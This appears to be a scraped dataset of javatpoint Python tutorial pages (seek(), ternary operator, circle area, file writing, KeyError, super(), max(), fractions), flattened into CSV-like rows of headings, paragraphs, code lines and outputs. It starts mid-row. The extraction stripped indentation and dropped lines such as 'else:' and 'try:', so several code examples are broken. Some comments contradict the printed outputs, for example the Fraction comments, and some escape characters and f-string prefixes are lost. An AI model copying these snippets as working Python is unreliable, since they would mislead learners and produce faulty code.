Xn=Xold/Xmax|||Min-Max approach Xn=Xold-Xmin/Xmax-Xmin|||Z-score Xn=Xold-µ/Ꝺ|||µ - average value|||Ꝺ-standard deviation||||||Use visualization|||Use numerical evaluation methods.|||']"
234,['Python seek() Method'],"['Python seek() method is used for changing the current location of the file handle. The file handle is like a cursor, which is used for defining the location of the data which has to be read or written in the file.']","['https://www.javatpoint.com/ternary-operator-in-python', 'https://www.javatpoint.com/python-data-analytics', 'https://www.javatpoint.com/ternary-operator-in-python', 'https://www.javatpoint.com/python-data-analytics', 'https://www.javatpoint.com/ternary-operator-in-python']",[],[],[],"['Syntax:', 'Parameters:']",['NOTE: The seek() method in Python does not return any value.'],"['Offset: This is used for defining the number of positions to move forward.', 'from_where: This is used for defining the point of reference.', 'The from_where argument is used for selecting the reference point. It can accept three values:', 'Example1: (The user has to read the text file, which contains the following text:', '""This is the sentence I am Writing to show the example of the seek() method working in Python.""', 'Sample Text File -', 'Example 2: (method 2)', 'The seek() method can also work with the negative offset, but only when the file is opened in binary mode.', 'Example 3: (negative offset)']","['The from_where argument is set to 0 by default. Therefore, the reference point cannot be set to the current position or end position, in the text mode, except when the offset is equal to 0.']",[],"['fi.seek(offset, from_where), where fi is the file pointer', 'fi = open(""text.txt"", ""r"")', '# the second parameter of the seek method is by default 0', 'fi.seek(30)', '# now, we will print the current position', 'print(fi.tell())', 'print(fi.readline())', 'fi.close()', ""# let's assuming the text file has following 5 lines"", '# line 1: This is the sentence I am Writing to show the example of the seek()', '# method working in Python.', '# line 2: The line no. 2 for showing the second method of writing the seek()', '# method is python', '# Line 3: the line no. 3 for showing the second method', '# Line 4: the line no. 4 for showing the second method', '# Line 5: the line no. 5 for showing the second method', 'fi = open (""text.txt"", ""r+"")', 'print (""Name of the file: "", fi.name)', 'line_1 = fi.readline()', 'print (""Read Line: %s"" % (line_1))', '# Again, set the pointer to the beginning', 'fi.seek (0, 1)', 'line_2 = fi.readline()', 'print (""Read Line: %s"" % (line_2))', '# Close opend file', 'fi.close()', 'fi = open (""text.txt"", ""rb"")', '# the user is setting the reference point to thirtieth position to the left from', 'fi.seek (-70, 2)', '# now print the current position', 'print (fi.tell())', '# now the user will Convert the binary to string', ""print (fi.readline().decode('utf-8'))"", 'fi.close()']","['30', 'ing to show the example of the seek() method working in Python.', 'Name of the file:  text.txt', 'Read Line: This is the sentence I am Writing to show the example of the seek() method working in Python.', 'Read Line: The line no. 2 for showing the second method of writing the seek() method is python', '25', 'Writing to show the example of the seek() method working in Python.']",[],['|||0: The 0 value is used for setting the whence argument at the beginning of the file.|||1: The 1 value is used for setting the whence argument at the current position of the file.|||2: The 2 value is used for setting the whence argument at the end of the file.|||']
235,['Ternary Operator in Python'],"['It should be a priority for any developer who working on the Python programming language to write short, efficient, clean, and readable lines of code. In order to make things easier, Python provides the Ternary operators which offer a shorter and convenient method of writing conditional statements.']","['https://www.javatpoint.com/how-to-calculate-area-of-circle-using-python', 'https://www.javatpoint.com/python-seek-method', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-if-else', 'https://www.javatpoint.com/how-to-calculate-area-of-circle-using-python', 'https://www.javatpoint.com/python-seek-method', 'https://www.javatpoint.com/how-to-calculate-area-of-circle-using-python']",[],[],"['Understanding Conditional Statements in Python', 'Understanding the Ternary Operator in Python']",[],[],"['In the following tutorial, we will explore more about Ternary Operator, how it works, and work on some examples in the Python programming language.', 'But before we get to that, let us discuss the basics of conditional statements.', 'The if-else statement in Python is utilized in order to check if a condition is met.', 'Explanation:', 'Let us explore the concept of Ternary Operator in the Python programming language.', 'Let us consider the following syntax for the Ternary statement in Python.', 'Now let us consider an example based on the Ternary Operator in Python', 'Explanation:', 'If we try comparing the above example to the previous one, we can observe that this method utilizes significantly lesser lines of code.', 'A snippet of code is given below, which checks if a customer is eligible for the regular discount or the senior discount.', 'Explanation:']","['The Ternary operator in Python allows us to evaluate if a condition is True or False. This operator occupies only one line of code, which implies that it is more concise than a complete if-else statement.', ""Conditional statements, like if-else statements, helps us to regulate the program's flow. The snippet of code within the conditional statements only executes when a specific condition (or set of conditions) is satisfied."", 'In programming languages like Python, the if-else statement is the most common method in order to write conditional statements. However, the introduction of the ternary operator in Python offers a way to test for a condition on one single line.', 'While writing Python code, we may sometimes want to execute a block or line of code when a specific condition is satisfied. In order for us to perform such tasks and functionalities, the conditional statements become handy.', 'The name of the Python Ternary conditional operator is derived from the fact that it accepts three parameters: true_condition, expression, and false_condition.', 'The Ternary Operators are generally utilized in order to determine the variable\'s value. The variable takes on the value of ""true_condition"" if the statement results in True or ""false_condition"" if the statement results in False.', 'We can think of the ternary operators as a list comprehension used in the Python programming language in order to filter out a list. Or we can also think of it as a lambda function that is used to define a function.', ""However, like ternary operators, we should use them in order to improve the code's readability and should not go overboard with the ternary operators; otherwise, the code may become much harder to read.""]","['Let us consider an example. Suppose that we are creating an application that checks if a customer is eligible for a 15% discount at a movie theater. If the customer is aged 60 or above, they should be provided a discount; otherwise, no discount should be provided. We could use an if-else statement in order to create such a program.', 'In the above snippet of code, we have defined some variables as first_num, second_num, and max, specifying them with values like 10, 20, and None. We have then used the if-else statement to check which number is more significant. At last, we have printed the values for the users. As a result, the program evaluated the statements and returned the appropriate output.', 'However, as we can observe, the if-else statement consumes multiple lines of code. Thus, in order to reduce these lines of code, Python developers adopt a more concise way to write the conditional statement while evaluating a few conditions only, that is, the Ternary Operator in Python.', 'The Ternary Operator is a type of condition expression in the Python programming language that allows the developers to evaluate statements. The Ternary Operators execute an action depending on if that statement either True or False. Thus, these operators are more concise than a traditional if-else statement.', 'Both lambda functions and list comprehensions are more effective methods in order to perform any action (such as defining a function and list filtration, respectively). Similarly, a ternary operator turns out to be a more efficient and effective method to write an if-else statement.', 'Suppose that we want to include a discount option at an event booking application for customers of age 60 or older. If a customer is younger than age 60, they are not eligible for a discount. We could check whether a customer is entitled to receive a discount using the snippet of code shown below:', ""In the above snippet of code, we have defined a variable storing the value of the customer's age. We have then used the Ternary operator in order to check if the provided customer's age lies under the discount eligibility criteria or not and printed the result for the users. Since the value was 40, which is below 60, thus the program returned the else statement for the users."", 'Let us consider another example for better understanding. Suppose that we need to set a particular rate of discount relying on if the customer lies within an eligibility criterion. By default, our event booking application is providing all customers a 10% discount; however, customers of age 60 or older are eligible for a 20% discount.', ""In the above snippet of code, we have defined a variable storing the value of the customer's age. We have then used the Ternary operator in order to check if the provided customer's age lies under the senior discount eligibility criteria or not and printed the result for the users. Since the value was 40, which is below 60, thus the program returned 10 as the eligible discount statement for the users.""]","['# defining the values of variables', 'first_num = 10', 'second_num = 20', 'max = None', '# using the if-else statement', '# to check the larger number', 'if first_num > second_num:', 'max = first_num', 'max = second_num', '# printing data', 'print(""First Number:"", first_num)', 'print(""Second Number:"", second_num)', 'print(""Larger Number:"", max)', '[true_condition] if [expression] else [false_condition]', '# given customer age', 'cust_age = 40', '# using Ternary operator to check discount eligibility', 'cust_discount = ""Eligible for Discount"" if cust_age >= 60 else ""Not Eligible for Discount""', '# printing the result', 'print( cust_discount )', '# given customer age', 'cust_age = 40', '# using Ternary operator to check discount eligibility', 'cust_discount = 20 if cust_age >= 60 else 10', '# printing the result', 'print( ""Customer\'s Age: "", cust_age )', 'print( ""Discount provided:"", cust_discount )']","['First Number: 10', 'Second Number: 20', 'Larger Number: 20', 'Not Eligible for Discount', ""Customer's Age:  40"", 'Discount provided: 10']",[],[]
236,['How to Calculate the Area of the Circle using Python'],"['In this tutorial, we will show how the user can calculate the area of the circle by using Python with the given radius of the circle.']","['https://www.javatpoint.com/how-to-write-in-text-file-using-python', 'https://www.javatpoint.com/ternary-operator-in-python', 'https://www.javatpoint.com/how-to-write-in-text-file-using-python', 'https://www.javatpoint.com/ternary-operator-in-python', 'https://www.javatpoint.com/how-to-write-in-text-file-using-python']",['https://static.javatpoint.com/python/images/how-to-calculate-area-of-circle-using-python.png'],[],"['Methods for finding the Area of the Given Circle using Python', 'Conclusion']","['Algorithm for Calculating the Area of the Given Circle', 'Area of Circle = π * R * R.']",[],"['To understand the format of the input-output of the code, the user must pay attention the following:', 'INPUT FORMAT:', 'The input of the code consists of the integer ""R"", which represents the radius of the circle.', 'OUTPUT FORMAT:', 'The output of the code will print the area of the circle.', 'Following are the steps we will use for calculating the area of the given circle:', 'Where, π (PI) = 3.14', 'R = Radius of circle.', 'D or (2R) = Diameter of Circle, (R + R).', 'Method 1: Find the area of the given circle using the math module.', 'Method 2: Calculate the area of the given circle using π', 'Method 3: Calculate the area of the given circle by using function']",[],"['In this tutorial, we have shown three methods for calculating the area of the given circle. To calculate the area of the given circle, the user must know the radius or the diameter of the circle. Among the three methods, the first one is the easiest and most direct method.']","['import math as M', 'Radius = float (input (""Please enter the radius of the given circle: ""))', 'area_of_the_circle = M.pi* Radius * Radius', 'print ("" The area of the given circle is: "", area_of_the_circle)', 'π = 3.14', 'Radius = float (input (""Please enter the radius of the given circle: ""))', 'area_of_the_circle = π * Radius * Radius', 'print ("" The area of the given circle is: "", area_of_the_circle)', 'import math', 'def area_of_the_circle (Radius):', 'area = Radius** 2 * math.pi', 'return area', 'Radius = float (input (""Please enter the radius of the given circle: ""))', 'print ("" The area of the given circle is: "", area_of_the_circle (Radius))']","['Please enter the radius of the given circle:  3', 'The area of the given circle is:  28.274333882308138', 'Please enter the radius of the given circle:  3', 'The area of the given circle is:  28.259999999999998', 'Please enter the radius of the given circle:  3', 'The area of the given circle is:  28.274333882308138']",[],"['|||Step 1: We have to pass the input using the input() function. The input will be corresponding to the radius of the given circle.|||Step 2: The Area of the circle will be calculated by using the formula of the Area = πR2.||||||Step 3: Print the output of the code, that is, the area of the given circle.|||']"
237,['How to Write in Text File using Python'],"['In this tutorial, we will explain how the users can write in the text file using Python language.']","['https://www.javatpoint.com/python-keyerror', 'https://www.javatpoint.com/how-to-calculate-area-of-circle-using-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-keyerror', 'https://www.javatpoint.com/how-to-calculate-area-of-circle-using-python', 'https://www.javatpoint.com/python-keyerror']","['https://static.javatpoint.com/python/images/how-to-write-in-text-file-using-python.png', 'https://static.javatpoint.com/python/images/how-to-write-in-text-file-using-python2.png', 'https://static.javatpoint.com/python/images/how-to-write-in-text-file-using-python3.png']",[],"['Steps Used for Writing in the Text File:', 'Conclusion']",[],[],"['Python has an inbuilt function to create, write or read the files. It can handle two types of files normal text files and binary files.', 'Example: (To show how the user can write in the text file using Python)', 'For writing in the text file using Python, the user has to follow the following steps:', 'Syntax: To open a file', 'The open() function can accept various parameters. But the user has to focus on the first two:', 'For writing in the text file, the user will use the following mode:', 'The open() function will return the file object, and the file object will have two useful functions to write text in the file:', 'The writelines() function can also accept the iterable object. The user can also pass the tuple of strings, the set of strings, etc.', 'To write the line in the text file, the user has to add the new line character manually.', 'Example 1: To show how the user can add the new line character in the Text.txt file', 'It is totally up to the user whether they want to add the text in the following line or not.', 'Example 2: To show how to use the write() function for writing the list of texts in the text file', 'If the text.txt file does not exist in the folder, the open() function will create the new file.', 'Example 3: To show how the user can write the list of text strings in the text.txt file.', 'If the user treats each element of the list as the line, then they have to link it with the newline character.', 'Example 4: To show how the user can link the newline character with each element of the line in the text.txt file', 'In this tutorial, we have explained how the user can write the text in the text file using Python and its different functions.']","['The write() function is used for writing the string in the text file, and the writelines() function is used for writing the list of the string in the file at once.']",[],"[""with open ('writeme.txt', 'w') as file:"", ""file.write('writeme')"", 'file = open (path_to_the_file, mode)', ""file.write('\\n')"", ""file.writelines('\\n')"", ""lines_1 = ['Text', 'this is the example to show how the user can write in the text file by using Python']"", ""with open ('text.txt', 'w') as file:"", 'for line_1 in lines_1:', 'file.write(line_1)', ""file.write('\\n')"", ""lines_1 = ['Text 2', ' This is the example no. 3 to show how the user can write in the text file by using Python']"", ""with open ('text.txt', 'w') as file:"", 'for line_1 in lines_1:', 'file.writelines(line_1)', ""lines_1 = ['Text 2.', ' This is the example no. 3 to show how the user can write in the text file by using Python.']"", ""with open ('text_2.txt', 'w') as file:"", 'for line_1 in lines_1:', ""file.write('\\n'.join(lines_1))""]",[],"[""Mode|||Description&&&'w'|||It is used to open the text file for writing text.&&&'a'|||It is used for opening the text file to append text.""]","['|||Normal Text File: In the text file, every line of the text is terminated with the special character known as ""End of Line"" (EOL). By default, it is the new line character (\'\\n\') in python.|||Binary File: In the binary file, no line is terminated, and the data is stored after it is converted into machine binary language.||||||Step 1: The user has to open the text file for writing or appending by using the open() function.|||Step 2: The user can write in the text file by using the write() or writelines() function.|||Step 3: The user can close the text file by using the close() function.||||||The ""path_to_the_file"" parameter is used for specifying the path of the text file that the user wants to open for writing.|||The mode parameter is used for specifying the mode ( write, read, etc.) for which the user wants to open the text file.||||||write()|||writelines()|||']"
238,['Python KeyError'],"['A map is a data structure in Python that maps one set into another set of values. The Python dictionary is the most widely used in the mapping. A key is assigned to each value, which may be used to see the value. A keyerror happens when the key does not exist in the mapping that is used to look up the value.']","['https://www.javatpoint.com/python-super-function', 'https://www.javatpoint.com/how-to-write-in-text-file-using-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-dictionary', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-strings', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tuples', 'https://www.javatpoint.com/python-super-function', 'https://www.javatpoint.com/how-to-write-in-text-file-using-python', 'https://www.javatpoint.com/python-super-function']",[],[],"['Dictionary in Python', 'Keyerror in Python', 'Handling Mechanism for a keyerror in Python', 'Conclusion']","['The usual solution: .get() method', 'The generic solution for keyerror: try-except method']",[],"['For example:', ""Let's take an example to understand how we may use the dictionary (dict) in python."", 'Output: After executing this above code, we will get the output as shown below:', 'For example: ', 'Output: After executing this above code, we will get the output as shown below:', 'For Example:', ""Let's take an example to understand how we may handle the mechanism for a keyerror in Python."", 'Output: After executing this above code, we will get the output as shown below:', 'The common approach is to utilize the try-except block to address such issues by raising the relevant code and providing a backup solution.', 'For example:', ""Let's take an example to understand how we may apply the generic solution for keyerror."", 'Output: After executing this code, we will get the output as shown below:', 'Output: After executing this code, we will get the output as shown below:']","['In this article, we are going to discuss Python keyerror and keyerror handling with their examples. But before discussing the Python keyerror, we will know about the dictionary in Python.', 'Here we see that we are getting the value of the book from the items. Therefore, if we want to print any other key-value which is not in the items, it will print this output.', 'Exceptions do not have to be scary. We can utilize these methods to make our programs flow more predictably if we comprehend the information presented to us in their tracebacks and the root cause of the error.']","['A dictionary (dict) in Python is a discrete collection of values containing stored data values equivalent to a map. It differs from other data types in that it only has one element, which is a single value. It contains the key and value pair. It is more efficient because of the key value. A colon denotes the separation of a key and value pair, and a comma denotes the separation of each key. This Python dictionary works in the same way as a regular dictionary. The keys must be unique and made up of unchangeable data types, including strings, integers, and tuples.', ""When we try to access a key from a dict that does not exist, Python raises a Keyerror. It's a built-in exception class raised by several modules that interact with dicts or objects containing key-value pairs. Now, we know that what is a Python dictionary and how it works. Let us look at what defines a Keyerror. Python raises a Keyerror whenever we want to access a key that isn't in the Python dictionary."", ""Mapping logic is a data structure that connects one piece of data to other significant data. As a result, when the mapping is accessed but not found, an error is raised. It's similar to a lookup error, where the semantic fault is that the key we're seeking isn't in its memory. It is better represented in the below example."", ""Let's take an example to understand how we may see the Keyerror in Python. We take the keys A, B, C, and D, in which D is not present in the python dictionary. Although, the remaining keys present in the dictionary show the output correctly, and D shows the keyerror."", 'Anyone who comes across a Keyerror can deal with it responsibly. It may examine all possible inputs to a specific program and correctly manage any risky entries. When we get a KeyError, there are a few conventional methods for dealing with it. In addition, some methods may use to handling the mechanism for a keyerror.', 'Some of these options may be better or may not be the exact solution we are searching for, depending on our use case. However, the ultimate goal is to prevent unexpected key error exceptions from occurring. For example, if we obtain an error from a dictionary in our own code, we may use the .get() method to get either the specified key or a default value.', ""Now, we understand some common scenarios in which Python's Keyerror exception may be thrown, as well as several excellent strategies for preventing them from terminating our program. The next time we encounter a Keyerror, we'll know it's most likely due to a faulty dictionary key lookup. By looking at the last few lines of the traceback, we may get all of the information we would need to figure out where the problem comes from."", ""If the issue is a dictionary key lookup in our own code, we may use the safer .get() function with a default return value instead of querying the key directly on the dictionary. If our code doesn't cause the issue, the try-except block is our best bet for regulating the flow of our code.""]","['# A null Dictionary', 'Dict = {}', 'print(""Null dict: "")', 'print(Dict)', '# A Dictionary using Integers', ""Dict = {1: 'Hill', 2: 'And', 3: 'Mountin'}"", 'print(""nDictionary with the use of Integers: "")', 'print(Dict)', '# A Dictionary using Mixed keys', ""Dict = {'Name': 'John', 1: [17, 43, 22, 51]}"", 'print(""nDictionary with the use of Mixed Keys: "")', 'print(Dict)', '# A Dictionary using the dict() method', ""Dict = dict({1: 'London', 2: 'America', 3:'France'})"", 'print(""nDictionary with the use of dict(): "")', 'print(Dict)', '# A Dictionary having each item as a Pair', ""Dict = dict([(1, 'Hello'), (2, 'World')])"", 'print(""nDictionary with each item as a pair: "")', 'print(Dict)', '# Check the Keyerror', ""ages={'A':45,'B':51,'C':67}"", ""print(ages['A'])"", ""print(ages['B'])"", ""print(ages['C'])"", ""print(ages['D'])"", '# List of vehicles and their prices.', 'vehicles = {""Car="": 300000, ""Byke"": 115000, ""Bus"": 250000}', 'vehicle = input(""Get price for: "")', 'vehicle1 = vehicles.get(vehicle)', 'if vehicle1:', 'print(""{vehicle} is {vehicle1} rupees."")', 'print(""{vehicle}\'s cost is unknown."")', '# Creating a dictionary to store items and prices', 'items = {""Pen"" : ""12"", ""Book"" : ""45"", ""Pencil"" : ""10""}', 'print (items[""Book""])', 'except:', 'print (""The items does not contain a record for this key."")', '# Creating a dictionary to store items and prices', 'items = {""Pen"" : ""12"", ""Book"" : ""45"", ""Pencil"" : ""10""}', 'print (items[""Notebook""])', 'except:', 'print (""The items does not contain a record for this key."")']","['Null dict:', '{}', 'nDictionary with the use of Integers:', ""{1: 'Hill', 2: 'And', 3: 'Mountin'}"", 'nDictionary with the use of Mixed Keys:', ""{'Name': 'John', 1: [17, 43, 22, 51]}"", 'nDictionary with the use of dict():', ""{1: 'London', 2: 'America', 3: 'France'}"", 'nDictionary with each item as a pair:', ""{1: 'Hello', 2: 'World'}"", '45', '51', '67', 'Traceback (most recent call last):', 'File """", line 6, in', ""KeyError: 'D'"", 'Get price for: Car', 'Car is 300000 rupees.', '45', 'The items does not contain a record for this key.']",[],[]
239,['Python super() Function'],"['As we all know that, Python is an object-oriented programming language. Therefore, Python follows all the concepts of OOPs, and one of such concepts is inheritance.']","['https://www.javatpoint.com/max-function-in-python', 'https://www.javatpoint.com/python-keyerror', 'https://www.javatpoint.com/https://www.javatpoint.com/inheritance-in-python', 'https://www.javatpoint.com/max-function-in-python', 'https://www.javatpoint.com/python-keyerror', 'https://www.javatpoint.com/max-function-in-python']",[],[],"['Using super() function in single inheritance in Python', 'Using super() function in multiple inheritances in Python']","['Benefits of super() function:', 'Constraints of using super() function:']",[],"['Following are the benefits of using a super() function in child class:', 'Following are three constraints that we must have to follow to use the super() function in a Python program:', 'In this example, we will use animals as the reference for a single inheritance example.', 'Cats, horses, cows, dogs, etc., all are part of class animalia. They all share some common characteristics also:', 'Explanation:', ""In this example, we will use a parent class, i.e., mammal class. Then, we will inherit the 'Can Fly' and 'Can Swim' classes from the mammal class."", 'Explanation:']","['So, we can see that the animal class we are using here is inherited from multiple base classes, and therefore, it is an example of multiple inheritances in Python. Now, look at the following program.']","['While using the inheritance concept, we can refer to a parent class with the use of super() function inside the inherited or child class. The super() function we use in the child class returns a temporary created object of the superclass, that allow us to access all of its method present in the child class.', 'Now, as we know that, we can use the super() function in both types of inheritances in Python, i.e., single as well as multiple inheritances. Therefore, we will learn about using the super() function in both types of inheritance separately and with an example.', 'So, we can say that the class cats, class horses, and class dogs are the subclasses of the class animalia. This is an example of single inheritance because all the subclasses (class cats, class horses, and class dogs) are inherited from a single parent class only, i.e., class animalia. Now, look at the following program.', 'In the above code, we have defined animalia as parent class and inherited domestic, tail & legs, and mammal class from it. After that, we have defined the cat, horse, and dog class and used super function in it. With the help of super() function in these classes, we have accessed methods of animalia class in cat, horse & dog class.', ""These classes will represent if a given mammal can fly or not and can swim or not. We will define an animal class after that, and it will inherit from both 'Can Fly' and 'Can Swim' class and return us that given animal have the defined characteristics or not."", 'In the above code, we defined mammal as a parent class. After that, we inherited can fly & can swim classes from the mammal class. We used the methods of both can fly & can swim inside the animalia class with the help of super() function. The animalia class is inherited from both the can swim and can fly class.']","['# Define parent class animalia', 'class Animalia:', '# define construcors for parent animalia class', 'def __init__(self):', 'self.Legs = 4', 'self.adomestic = True', 'self.atail = True', 'self.amammals = True', '# define mammal class as child class', 'def aMammal(self):', 'if self.amammals:', 'print(""The given animal is a mammal type ."")', '# define domestic class as child class', 'def aDomestic(self):', 'if self.adomestic:', 'print(""The given animal is a domestic animal type."")', '# define dog class', 'class Dog(Animalia):', 'def __init__(self):', 'super().__init__() # using super() function to access class methods', 'def isMammal(self):', 'super().aMammal() # using mammal class', '# define cat class', 'class Cat(Animalia):', 'def __init__(self):', 'super().__init__()', 'def isMammal(self):', 'super().aDomestic() # using domestic class', '# define horse class', 'class Horse(Animalia):', 'def __init__(self):', 'super().__init__()', 'def TailandLegs(self): # using tail and legs class', 'if self.atail and self.Legs == 4:', 'print(""The given animal has four legs and a tail"")', ""# Taking the driver's code for defined classes"", 'Tommy = Dog()', 'Tommy.aMammal()', 'Tom = Cat()', 'Tom.aDomestic()', 'Burno = Horse()', 'Burno.TailandLegs()', '# Define Mammal class as parent class', 'class aMammals():', 'def __init__(self, name):', 'print(name, ""Is a mammal of animalia class"")', '# define can fly as child class', 'class FlyCapable(aMammals):', 'def __init__(self, FlyCapable_name):', 'print(FlyCapable_name, ""is not capable of flying"")', '# Calling Parent class Constructor', 'super().__init__(FlyCapable_name)', '# define can swim as child class', 'class SwimCapable(aMammals):', 'def __init__(self, SwimCapable_name):', 'print(SwimCapable_name, ""is not capable of swimming"")', 'super().__init__(SwimCapable_name)', '# Inherit animalia class from both fly and swim class', 'class animalia(FlyCapable, SwimCapable):', 'def __init__(self, name):', 'super().__init__(name) # using super() function', '# Taking driver Code for animalia class', 'Burno = animalia(""Cat"")']","['The given animal is a mammal type.', 'The given animal is a domestic animal type.', 'The given animal has four legs and a tail.', 'Cat is not capable of flying', 'Cat is not capable of swimming', 'Cat Is a mammal of animalia class']",[],"[""|||We don't need to remember the parent's class name while using the super() function. This is because we don't have to specify the name of the parent class to access the methods present in it.|||We can use the super() function with the single inheritance and multiple inheritances.|||The super() function in Python implements code reusability and modularity as there is no need for us to rewrite the whole function again and again.|||The super() function in Python is known as dynamical function, as we all know that Python is a dynamically typed programming language.||||||The arguments are given in the super() function and the arguments in the function that we have called should match.|||Every occurrence of the method that we are using should include the super() keyword after we use it.|||We have to specify the class and methods present in it, which are referred to by the super() function.||||||They all are pet animals.|||They all have four legs and a tail.|||As part of class animalia, they all are mammals as well.|||""]"
240,['max() function in Python'],"['In this tutorial, we will discuss the max() function and how to use it in the Python programming language. We will also consider various examples for better understanding.']","['https://www.javatpoint.com/fraction-module-in-python', 'https://www.javatpoint.com/python-super-function', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/fraction-module-in-python', 'https://www.javatpoint.com/python-super-function', 'https://www.javatpoint.com/fraction-module-in-python']",[],[],['Understanding the Python max() function'],"['The max() function with iterable arguments', 'The max() function with object arguments']",[],"[""So, let's get started."", 'The Python max() function has two different forms:', 'We can use the following syntax to find the largest data element in an iterable:', 'Parameters:', 'Let us consider an example based on this method in order to find the largest element in a list.', 'Example: 1', 'Explanation:', 'If the data elements in an iterable are strings, the max() function will return the largest element (ordered alphabetically).', 'Let us consider an example based on the largest string in a list.', 'Example: 2', 'Explanation:', 'Let us consider an example demonstrating the use of the max() function in dictionaries.', 'Example: 3', 'Explanation:', 'This function will return the values of dictionaries. Based on the returned values, the max() function will return the key having the largest value.', 'Points to Remember:', 'In the case of multiple iterators, the largest element from the specified iterators will be returned.', 'We can use the following syntax in order to find the largest object between more than one parameter.', 'Parameters:', 'Explanation:']","['The max() function in Python returns the most significant data element in an iterable. We can also use this function in order to find the largest data element between more than one parameter.', 'In the above snippet of code, we have created a list as my_digits. We have then used the max() function on the list in order to obtain the largest element in the list. At last, we have printed the resultant element for the users.', 'In the above snippet of code, we have defined a list as my_strings consisting of various strings. We have then used the max() function on the list to find the largest element as a string. At last, we have printed the element for the users.', 'Generally, the max() function returns the largest key in the case of dictionaries. We can also use the key parameter in order to find the key of the dictionary having the largest value.', 'Moreover, we can observe that in the second statement of the max() function in the above example, we have passed a lambda function to the key parameter.', 'If a void iterator is passed to the function, a ValueError exception is raised. In order to avoid this exception, we can include the default parameter in the function.', 'Thus, the max() function helps us in finding the largest element between multiple objects. Let us consider an example in order to find the maximum number among the given numbers.', 'In the above snippet of code, we have used the max() function to find the largest element among the specified objects as the parameters and printed the result for the users.']","['In the above snippet of code, we have created a dictionary with some values respected to their keys. We have then used the max() function in order to find the largest key within the dictionary. We have then used the max() function to find the key with the largest value and print that value for the users.']","['max(iterable, *iterables, key, default)', '# creating a list', 'my_digits = [12, 3, 8, 4, 15, 13, 10, 2, 9, 11]', '# using the max() function', 'large = max(my_digits)', '# printing the result', 'print(""The largest number in the list:"", large)', '# creating a list', 'my_strings = [""Apple"", ""Mango"", ""Banana"", ""Papaya"", ""Orange""]', '# using the max() function', 'large_str = max(my_strings)', '# printing the result', 'print(""The largest string in the list:"", large_str)', '# creating a list', 'my_dict = {1 : 1, -3 : 9, 2 : 4, -5 : 25, 4 : 16}', '# using the max() function to find largest key', 'key_1 = max(my_dict)', '# printing the resultant key', 'print(""The largest key in the dictionary:"", key_1)', '# using the key() function to find the key with largest value', 'key_2 = max(my_dict, key = lambda x : my_dict[x])', '# printing the resultant key', 'print(""The Key of the largest value in the dictionary:"", key_2)', '# printing the largest value', 'print(""The largest value in the dictionary:"", my_dict[key_2])', 'key = lambda x : my_dict[x]', 'max(arg1, arg2, *args, key)', '# using the max() function with objects as numbers', 'large_num = max(10, -4, 5, -3, 13)', '# printing the result', 'print(""The largest number:"", large_num)']","['The largest number in the list: 15', 'The largest string in the list: Papaya', 'The largest key in the dictionary: 4', 'The Key of the largest value in the dictionary: -5', 'The largest value in the dictionary: 25', 'The largest number: 13']",[],"['|||max() function using iterable as arguments|||max() function using objects as arguments||||||iterable: This parameter is iterable. For example, tuple, list, dictionary, set, and a lot more.|||*iterables (optional): This is an optional parameter indicating multiple iterables.|||key (optional): This is also an optional parameter. This parameter works when the iterables are passed, and the comparison is made on the basis of its return value.|||default (optional): This is another optional parameter providing the default value to the function if the specified iterable is void.||||||arg1: This parameter is an object. For example, numbers, strings, and a lot more.|||arg2: This parameter is also an object. For example, numbers, strings, and a lot more.|||*args (optional): This parameter is an optional parameter for more objects.|||key (optional): This parameter is also an optional parameter that works when each parameter is passed, and comparison is made on the basis of its return value.|||']"
241,['Fraction Module in Python'],"['Python Fraction module is used to work with the arithmetic of rational numbers. This module allows us to create a Fractional instance of integers, floats, numbers, decimal, and strings.']","['https://www.javatpoint.com/popular-python-framework-to-build-api', 'https://www.javatpoint.com/max-function-in-python', 'https://www.javatpoint.com/popular-python-framework-to-build-api', 'https://www.javatpoint.com/max-function-in-python', 'https://www.javatpoint.com/popular-python-framework-to-build-api']",[],[],"['How to create a fractional instance?', 'Conclusion']",['What is a Fractional Instance?'],[],['Example - 2: Perform Mathematical Operation on Fractional'],"['Fractional instances can be created using the pair of integers, or from a string, or another rational number. These are hashable and should be treated as mutable.', ""Fraction module provides the following built-in functions that are used to create fraction. Let's understand the following ways of creating fraction instance."", 'In this tutorial, we have discussed Fraction module and its few important methods. These methods can be used in the complex mathematical computation and machine learning project.']",[],"['from fractions import Fraction', 'print (Fraction(10, 37))', '# returns Fraction(11, 35)', 'print (Fraction(11, 18))', '# returns Fraction(5, 9)', 'print (Fraction())', '# returns Fraction(0, 1)', 'from fractions import Fraction', 'print(Fraction(1/12))', 'from fractions import Fraction', ""print (Fraction('2.26'))"", 'from fractions import Fraction', ""print (Fraction('7/25'))"", ""print (Fraction('1.23'))"", ""print (Fraction('3/5'))"", ""print (Fraction('1.414213 \\t\\n'))"", 'from fractions import Fraction', ""print (Fraction('3.14159265358979323846'))"", ""print (Fraction('3.14159265358979323846').limit_denominator(10000))"", ""print (Fraction('3.14159265358979323846').limit_denominator(100))"", ""print (Fraction('3.14159265358979323846').limit_denominator(10))"", 'print (Fraction(125, 50).numerator)', 'print (Fraction(125, 50).denominator)', 'from fractions import Fraction', 'print (Fraction(56, 12) + Fraction(18, 25))', 'print (Fraction(5, 2) / Fraction(12, 10))', 'print (Fraction(16, 15) * Fraction(26, 39))', 'print (Fraction(18, 5) * Fraction(15, 36))', 'print (Fraction(22, 5) ** Fraction(6, 10))']","['10/37', '11/18', '0', '6004799503160661/72057594037927936', '113/50', '7/25', '123/100', '3/5', '1414213/1000000', '157079632679489661923/50000000000000000000', '355/113', '311/99', '22/7', '5', '2', '404/75', '25/12', '32/45', '3/2', '2.4326050606703427']",[],"[""|||class fractions.Function(numerator = 0, denominator = 1): - This methods assigns numerator as 0 and denominator as 1 by default. If the denominator is equal to 0, it will raise the Zerodivision error. Let's understand the following example.||||||class fractions.Fraction(other_fraction) : This method takes the other_fraction instance of a number. It returns rational and a fraction instance with same value.|||class fractions.Fraction(float) - This method takes the float value and returns the same value fraction instance.||||||class fractions.Fraction(decimal) :- This method takes the decimal instance and returns the instance with the same value. Let's understand the following example.||||||class fractions.Fraction(string) : - This method takes the string or Unicode as an argument and returns the instance with the same value. 